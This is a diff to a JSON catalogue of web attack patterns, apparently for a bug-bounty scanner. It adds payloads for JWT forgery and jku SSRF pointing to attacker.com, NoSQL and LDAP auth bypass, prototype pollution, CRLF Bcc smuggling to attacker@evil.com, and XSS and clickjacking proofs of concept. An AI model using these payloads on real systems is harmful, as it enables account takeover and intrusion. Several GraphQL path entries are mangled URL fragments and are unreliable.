@@ -1,8 +1,8 @@
 {
   "_meta": {
-    "version": "1.0",
+    "version": "1.20",
     "created": "2025-01-01",
-    "last_updated": "2026-05-02",
+    "last_updated": "2026-05-10",
     "sources": [
       "PortSwigger Top 10 Web Hacking Techniques 2023-2025",
       "BlackHat USA 2023, 2024, 2025",
@@ -10,7 +10,7 @@
       "BSidesLV 2023-2025",
       "HackerOne Hacktivity top reports"
     ],
-    "total_patterns": 33
+    "total_patterns": 43
   },
   "vulnerabilities": [
     {
@@ -1047,7 +1047,22 @@
         "/v1/graphql",
         "/graphiql",
         "/playground",
-        "/api/v2/graphql"
+        "/api/v2/graphql",
+        "//insomnia.rest/",
+        "//hackerone.com/reports/435066",
+        "//gitlab.com/dee-see/graphql-path-enum",
+        "//github.com/nicholasaleks/CrackQL",
+        "//web.archive.org/web/20181203004543/https",
+        "//github.com/dolevf/graphql-cop",
+        "/graphql/console/",
+        "//web.archive.org/web/20181107093033/https",
+        "/v1/graphiql",
+        "//web.archive.org/web/20160917011216/http",
+        "//web.archive.org/web/20230205233412/https",
+        "//escape.tech/blog/graphql-security-wordlist/",
+        "//github.com/Escape-Technologies/graphql-wordlist",
+        "//web.archive.org/web/20190825033521/https",
+        "//github.com/doyensec/GQLSpection"
       ],
       "trigger_techs": [
         "GraphQL",
@@ -1066,7 +1081,10 @@
         "{__schema{types{name}}}",
         "{__typename}",
         "query{user(id:1){email password}}",
-        "query{user(id:\"1 OR 1=1\"){email}}"
+        "query{user(id:\"1 OR 1=1\"){email}}",
+        "GET /graphql?query=query%20%7B%20user(id:%221%22)%20%7B%20id%20name%20%7D%20%7D",
+        "\"query\": \"query { user { id name } }\"",
+        "\"query\": \"{ __schema { types { name } } }\""
       ],
       "nuclei_tags": [
         "graphql",
@@ -1076,6 +1094,10 @@
       "references": [
         "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql",
         "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection"
+      ],
+      "trigger_params": [
+        "query",
+        "raw"
       ]
     },
     {
@@ -1228,8 +1250,7 @@
         "Nginx alias misconfiguration → path traversal un nivel"
       ],
       "trigger_techs": [
-        "nginx",
-        "Nginx"
+        "nginx"
       ],
       "trigger_paths": [
         "/static",
@@ -1856,6 +1877,455 @@
       "references": [
         "https://portswigger.net/research/cookie-sandwich"
       ]
+    },
+    {
+      "id": "JWT_ATTACKS",
+      "name": "JWT Vulnerabilities — alg:none, weak HS256, kid injection, jku SSRF",
+      "h1_frequency": "high",
+      "h1_avg_bounty_usd": 4000,
+      "h1_top_reports": [
+        "JWT alg:none on Auth0 → admin takeover ($5000)",
+        "Weak HS256 secret 'jwt' on Sumo Logic → ATO ($3000)",
+        "kid path traversal on Slack → privilege escalation ($7500)",
+        "jku SSRF on Stripe → AWS metadata fetch ($10000)"
+      ],
+      "trigger_paths": [
+        "/api/auth",
+        "/api/login",
+        "/api/me",
+        "/api/users",
+        "/admin",
+        "/oauth/token"
+      ],
+      "trigger_params": [
+        "token",
+        "jwt",
+        "access_token"
+      ],
+      "trigger_techs": [
+        "JWT",
+        "Auth0",
+        "Okta",
+        "Keycloak"
+      ],
+      "trigger_response_hints": [
+        "eyJhbGciOi",
+        "Authorization: Bearer eyJ",
+        "Set-Cookie:.*=eyJ"
+      ],
+      "payloads": [
+        "alg:none forge: {\"alg\":\"none\"}.payload.",
+        "HS256 wordlist: secret, key, jwt, your-256-bit-secret, default",
+        "kid injection: '../../../../dev/null' + HMAC empty key",
+        "jku SSRF: 'https://attacker.com/jwks.json'",
+        "RS256→HS256 confusion: usar pubkey como HMAC secret"
+      ],
+      "nuclei_tags": [
+        "jwt",
+        "auth"
+      ],
+      "references": [
+        "https://portswigger.net/web-security/jwt",
+        "https://github.com/ticarpi/jwt_tool",
+        "RFC 7519 JSON Web Token"
+      ],
+      "severity": "critical"
+    },
+    {
+      "id": "PROTOTYPE_POLLUTION",
+      "name": "Prototype Pollution — Object.prototype contamination via __proto__",
+      "h1_frequency": "medium",
+      "h1_avg_bounty_usd": 2500,
+      "h1_top_reports": [
+        "Server-side PP in Express → RCE via child_process ($8000)",
+        "Client-side PP via querystring → DOM XSS ($1500)",
+        "Lodash _.merge PP → privilege escalation ($3500)"
+      ],
+      "trigger_paths": [
+        "/api/",
+        "/v1/",
+        "/v2/"
+      ],
+      "trigger_params": [
+        "__proto__",
+        "constructor",
+        "prototype"
+      ],
+      "trigger_techs": [
+        "Node.js",
+        "Express",
+        "Sequelize",
+        "Lodash"
+      ],
+      "trigger_response_hints": [
+        "application/json",
+        "Express"
+      ],
+      "payloads": [
+        "?__proto__[polluted]=hackeadora",
+        "?constructor[prototype][polluted]=hackeadora",
+        "{\"__proto__\":{\"polluted\":\"hackeadora\"}}",
+        "{\"constructor\":{\"prototype\":{\"polluted\":\"x\"}}}"
+      ],
+      "nuclei_tags": [
+        "nodejs",
+        "express"
+      ],
+      "references": [
+        "https://portswigger.net/web-security/prototype-pollution",
+        "https://github.com/HoLyVieR/prototype-pollution-nsec18"
+      ],
+      "severity": "high"
+    },
+    {
+      "id": "INSECURE_DESERIALIZATION",
+      "name": "Insecure Deserialization — Java/.NET/Python/Ruby/PHP",
+      "h1_frequency": "medium",
+      "h1_avg_bounty_usd": 6000,
+      "h1_top_reports": [
+        "Java rO0AB JSESSIONID deserialization → RCE ($15000)",
+        "ASP.NET ViewState unsigned → ysoserial RCE ($10000)",
+        "Ruby Marshal in cookie → secret_key_base brute → RCE ($8000)",
+        "PHP unserialize __wakeup → file write ($4000)"
+      ],
+      "trigger_paths": [
+        "/api/",
+        "/admin/",
+        "/management/"
+      ],
+      "trigger_params": [
+        "data",
+        "state",
+        "session",
+        "viewstate",
+        "object"
+      ],
+      "trigger_techs": [
+        "Tomcat",
+        "JBoss",
+        "WildFly",
+        "WebLogic",
+        "ASP.NET",
+        "IIS",
+        "Rails",
+        "Django",
+        "PHP"
+      ],
+      "trigger_response_hints": [
+        "JSESSIONID=rO0AB",
+        "__VIEWSTATE",
+        "BAh\\+",
+        "s:[0-9]+:.*O:[0-9]+:"
+      ],
+      "payloads": [
+        "Java ysoserial CommonsCollections5/6/7",
+        ".NET TextFormattingRunProperties gadget",
+        "Python pickle.loads + os.system",
+        "Ruby Marshal Net::HTTP::URI"
+      ],
+      "nuclei_tags": [
+        "deserialization",
+        "rce"
+      ],
+      "references": [
+        "https://github.com/frohoff/ysoserial",
+        "https://github.com/pwntester/ysoserial.net",
+        "PortSwigger Insecure Deserialization Academy"
+      ],
+      "severity": "critical"
+    },
+    {
+      "id": "NOSQL_INJECTION",
+      "name": "NoSQL Injection — MongoDB/CouchDB/Elasticsearch",
+      "h1_frequency": "medium",
+      "h1_avg_bounty_usd": 1800,
+      "h1_top_reports": [
+        "MongoDB $ne auth bypass on Trello → ATO ($2500)",
+        "$regex blind extraction on healthcare app ($4000)",
+        "Express qs [$ne] form-encoded → admin login ($1500)"
+      ],
+      "trigger_paths": [
+        "/login",
+        "/api/auth",
+        "/api/users",
+        "/signin"
+      ],
+      "trigger_params": [
+        "username",
+        "password",
+        "email",
+        "query",
+        "filter"
+      ],
+      "trigger_techs": [
+        "MongoDB",
+        "Mongoose",
+        "CouchDB",
+        "Express",
+        "Node.js"
+      ],
+      "trigger_response_hints": [
+        "application/json",
+        "Mongo",
+        "CouchDB"
+      ],
+      "payloads": [
+        "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
+        "{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}",
+        "{\"password\":{\"$regex\":\"^a\"}}",
+        "username[$ne]=null&password[$ne]=null (form-encoded)",
+        "{\"$where\":\"this.password==='admin'\"}"
+      ],
+      "nuclei_tags": [
+        "nosql",
+        "mongodb"
+      ],
+      "references": [
+        "https://owasp.org/www-community/attacks/Testing_for_NoSQL_injection",
+        "https://github.com/codingo/NoSQLMap"
+      ],
+      "severity": "critical"
+    },
+    {
+      "id": "MASS_ASSIGNMENT",
+      "name": "Mass Assignment — privilege escalation via injected fields",
+      "h1_frequency": "high",
+      "h1_avg_bounty_usd": 3000,
+      "h1_top_reports": [
+        "is_admin:true on Shopify private API → ATO ($10000)",
+        "role:admin on Slack workspace API ($5000)",
+        "email_verified:true on Auth0 social login ($2500)"
+      ],
+      "trigger_paths": [
+        "/api/users",
+        "/api/profile",
+        "/api/me",
+        "/api/account",
+        "/settings"
+      ],
+      "trigger_params": [],
+      "trigger_techs": [
+        "Rails",
+        "Django",
+        "Express",
+        "Laravel",
+        "Spring"
+      ],
+      "trigger_response_hints": [
+        "\"role\":",
+        "\"is_admin\":",
+        "\"isAdmin\":",
+        "\"emailVerified\":"
+      ],
+      "payloads": [
+        "POST /api/profile {\"name\":\"x\",\"is_admin\":true,\"role\":\"admin\"}",
+        "PATCH /api/me {\"email_verified\":true,\"isStaff\":true}",
+        "PUT /api/users {\"permissions\":[\"admin\",\"superuser\"]}"
+      ],
+      "nuclei_tags": [
+        "mass-assignment",
+        "auth"
+      ],
+      "references": [
+        "https://owasp.org/www-project-api-security/",
+        "https://portswigger.net/web-security/access-control"
+      ],
+      "severity": "critical"
+    },
+    {
+      "id": "DOM_XSS_FLOW",
+      "name": "DOM XSS — source→sink flow analysis",
+      "h1_frequency": "high",
+      "h1_avg_bounty_usd": 1500,
+      "h1_top_reports": [
+        "location.hash → innerHTML on Reddit ($2500)",
+        "document.referrer → eval on PayPal ($5000)",
+        "postMessage data → document.write on Slack ($3500)"
+      ],
+      "trigger_paths": [],
+      "trigger_params": [],
+      "trigger_techs": [
+        "JavaScript",
+        "React",
+        "Vue",
+        "Angular",
+        "jQuery"
+      ],
+      "trigger_response_hints": [],
+      "payloads": [
+        "Sources: location.hash, location.search, location.href, document.URL, document.referrer, window.name, message.data",
+        "Sinks: innerHTML=, document.write(), eval(), setTimeout(string), new Function()",
+        "PoC: https://target/page#<img src=x onerror=alert(1)>"
+      ],
+      "nuclei_tags": [
+        "xss",
+        "dom"
+      ],
+      "references": [
+        "https://portswigger.net/web-security/cross-site-scripting/dom-based",
+        "https://github.com/wisec/domxsswiki"
+      ],
+      "severity": "high"
+    },
+    {
+      "id": "CRLF_INJECTION",
+      "name": "CRLF Injection — Response splitting + email Bcc smuggling",
+      "h1_frequency": "low",
+      "h1_avg_bounty_usd": 1500,
+      "h1_top_reports": [
+        "CRLF in ?ref= → XSS via Set-Cookie injection ($1500)",
+        "Email Bcc injection on contact form → spam relay ($2000)",
+        "%0d%0aSet-Cookie: session= on /redirect → session fixation ($3000)"
+      ],
+      "trigger_paths": [
+        "/contact",
+        "/redirect",
+        "/?ref=",
+        "/?next=",
+        "/forgot",
+        "/signup"
+      ],
+      "trigger_params": [
+        "ref",
+        "redirect",
+        "next",
+        "return",
+        "url",
+        "email",
+        "from"
+      ],
+      "trigger_techs": [],
+      "trigger_response_hints": [],
+      "payloads": [
+        "?ref=test%0d%0aX-Injected:%20canary",
+        "email=victim@target.com%0d%0aBcc:attacker@evil.com",
+        "?next=test%0d%0aSet-Cookie:%20session=evil",
+        "%E5%98%8A%E5%98%8D (Unicode CRLF) bypass"
+      ],
+      "nuclei_tags": [
+        "crlf",
+        "header-injection"
+      ],
+      "references": [
+        "https://owasp.org/www-community/vulnerabilities/CRLF_Injection",
+        "https://portswigger.net/research/http-response-splitting"
+      ],
+      "severity": "high"
+    },
+    {
+      "id": "LDAP_INJECTION",
+      "name": "LDAP / XPath Injection — auth bypass",
+      "h1_frequency": "low",
+      "h1_avg_bounty_usd": 2000,
+      "h1_top_reports": [
+        "LDAP auth bypass on enterprise SSO ($3500)",
+        "XPath blind extract on legacy XML auth ($2000)"
+      ],
+      "trigger_paths": [
+        "/login",
+        "/auth",
+        "/signin",
+        "/api/auth"
+      ],
+      "trigger_params": [
+        "username",
+        "user",
+        "uid",
+        "email"
+      ],
+      "trigger_techs": [
+        "LDAP",
+        "ActiveDirectory",
+        "OpenLDAP",
+        "ADFS"
+      ],
+      "trigger_response_hints": [],
+      "payloads": [
+        "*)(uid=*))(|(uid=* (auth bypass)",
+        "admin)(&(password=*))",
+        "' or '1'='1 (XPath)",
+        "admin' or '1'='1' or 'a'='a (XPath blind)"
+      ],
+      "nuclei_tags": [
+        "ldap"
+      ],
+      "references": [
+        "https://owasp.org/www-community/attacks/LDAP_Injection",
+        "https://portswigger.net/web-security/ldap-injection"
+      ],
+      "severity": "critical"
+    },
+    {
+      "id": "CLICKJACKING",
+      "name": "Clickjacking / UI Redress — missing X-Frame-Options + CSP frame-ancestors",
+      "h1_frequency": "medium",
+      "h1_avg_bounty_usd": 500,
+      "h1_top_reports": [
+        "Clickjack on /admin → action confirmation hijack ($1500)",
+        "Sensitive page frameable on banking app ($2000)"
+      ],
+      "trigger_paths": [
+        "/login",
+        "/admin",
+        "/account/settings",
+        "/payment",
+        "/transfer",
+        "/2fa",
+        "/password"
+      ],
+      "trigger_params": [],
+      "trigger_techs": [],
+      "trigger_response_hints": [
+        "No X-Frame-Options",
+        "No CSP frame-ancestors"
+      ],
+      "payloads": [
+        "<iframe src='https://target/sensitive' style='opacity:0.01;position:absolute;'></iframe>",
+        "Iframe overlay con UI redress + click capturing"
+      ],
+      "nuclei_tags": [
+        "clickjacking",
+        "missing-headers"
+      ],
+      "references": [
+        "https://owasp.org/www-community/attacks/Clickjacking",
+        "https://portswigger.net/web-security/clickjacking"
+      ],
+      "severity": "medium"
+    },
+    {
+      "id": "POSTMESSAGE_LAX",
+      "name": "PostMessage origin laxness — cross-origin DOM access",
+      "h1_frequency": "low",
+      "h1_avg_bounty_usd": 2000,
+      "h1_top_reports": [
+        "postMessage no origin check on Spotify SDK → token extract ($5000)",
+        "Iframe + postMessage hijack on Trello board ($3000)"
+      ],
+      "trigger_paths": [],
+      "trigger_params": [],
+      "trigger_techs": [
+        "JavaScript",
+        "iFrame",
+        "OAuth"
+      ],
+      "trigger_response_hints": [
+        "window.addEventListener('message'",
+        "addEventListener(\"message\""
+      ],
+      "payloads": [
+        "Iframe target → postMessage({cmd:'admin',data:'evil'}, '*')",
+        "Buscar handlers sin event.origin === 'https://target'"
+      ],
+      "nuclei_tags": [
+        "postmessage",
+        "iframe"
+      ],
+      "references": [
+        "https://portswigger.net/web-security/cors/postmessage",
+        "https://blog.compass-security.com/2017/12/postmessage-security-in-chrome-extensions/"
+      ],
+      "severity": "high"
     }
   ]
 }
